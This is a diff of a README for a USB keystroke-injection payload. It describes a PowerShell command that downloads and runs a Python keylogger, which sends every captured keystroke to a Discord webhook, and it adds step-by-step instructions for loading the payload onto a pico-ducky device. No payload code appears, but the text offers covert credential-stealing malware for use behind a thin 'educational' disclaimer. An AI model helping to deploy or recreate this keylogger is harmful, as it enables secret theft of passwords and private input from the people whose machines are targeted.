@@ -1,15 +1,29 @@
 THIS IS ONLY MADE FOR EDUCATIONAL PURPOSES
 
 
-# What it Does
+# What it Does:
 
 This payload executes a powershell command that downloads a python keylogger and runs it. This keylogger sends the keys pressed over discord using a webhook.
 
-# Dependencies
+# Dependencies:
 
 - Windows
 - Python
 - User is admin
+
+# How to use:
+
+## Pico-Ducky
+
+If you have a [pico-ducky](https://github.com/dbisu/pico-ducky) which is what this payload was originally built for you just download the keylog-starter.dd and place it in the root of your pico directory. If you have a pico-ducky without wifi you need to rename it to ``payload.dd`` ``payload2.dd`` ``payload3.dd`` or ``payload4.dd`` read more here [here](https://github.com/dbisu/pico-ducky).
+
+## P4wnP1 A.L.O.A
+
+I am working on a version for HID script
+
+## Any other ducky script compatible tools
+
+I havent tested any others but if you do please open up an issue and tell me how it went
 
 # How it Works:
 
